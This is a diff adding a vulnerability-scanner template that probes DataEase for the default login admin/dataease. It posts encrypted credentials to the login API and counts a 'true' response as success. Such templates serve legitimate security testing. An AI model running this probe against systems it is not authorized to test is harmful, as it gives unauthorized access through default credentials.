@@ -1,0 +1,15 @@
+name: poc-yaml-飞致云-DateEase-default-passwd
+description: >-
+  默认密码admin/dataease
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: POST
+    path: /api/auth/login
+    headers:
+      Content-Type: application/json
+    body: >-
+      {"username":"g24DUpuiuhas+dTXGTjqFQAZiIEVLgQEJR31oS8smIWqsKx7QbfAEfTUCfSqt0NXZx9NPMYSHWfefPZ+k3mLYg==","password":"PBFg6uoRZ7hO2oKw4MRGYsY/nTT91qktzawbfyTNg8Fpy/CiugLf59Uf0sanY85udQTmHKbxuiZoCVIgV5d9Uw==","loginType":0}
+    expression:
+      status: 200
+      body_all: ["true"]
